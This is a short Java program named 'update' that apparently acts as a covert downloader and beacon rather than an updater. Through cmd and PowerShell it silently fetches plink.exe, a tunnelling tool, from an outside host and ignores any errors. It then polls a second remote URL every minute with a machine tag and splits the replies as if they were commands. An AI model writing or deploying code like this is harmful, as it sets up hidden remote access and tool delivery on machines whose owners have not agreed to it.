package update;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
public class update{

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		try {
			Runtime runtime = Runtime.getRuntime();
	        String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://pannello.xoom.it/svc/plink.dat' -OutFile 'd:\\dati\\plink.exe'";
	        Process proc = runtime.exec(cmds);
		}
		catch (IOException e) {
		}
		//try {
	        while (true) {
	        	String result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc=pippo");
	        	String[] array = result.split("\\|\\|", -1);
	        	//Runtime runtime = Runtime.getRuntime();
		        //String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://paner.altervista.org/svc/wup.php?pc=peppino' -OutFile 'd:\\dati\\log.txt'";
		        //Process proc = runtime.exec(cmds);
		        try {
		        	Thread.sleep(60 * 1000);
		        }
		        catch (InterruptedException e) {
		            e.printStackTrace();
		        }
	        }
		//}
	    //catch (IOException e) {
		//}
	}
	public static String getResponseFromUrl(String surl) {
		String webPage = surl;
		String result="";
		URLConnection urlConnection;

		try{
			URL url = new URL(webPage);
			try{
				urlConnection = url.openConnection();

				InputStream is = urlConnection.getInputStream();
				InputStreamReader isr = new InputStreamReader(is);

				int numCharsRead;
				char[] charArray = new char[1024];
				StringBuffer sb = new StringBuffer();
				while ((numCharsRead = isr.read(charArray)) > 0) {
					sb.append(charArray, 0, numCharsRead);
				}
				result = sb.toString();
			}catch(IOException ex){
				//do exception handling here
			}
		}catch(MalformedURLException malex){
			//do exception handling here
		}

		return  result;
	}

}
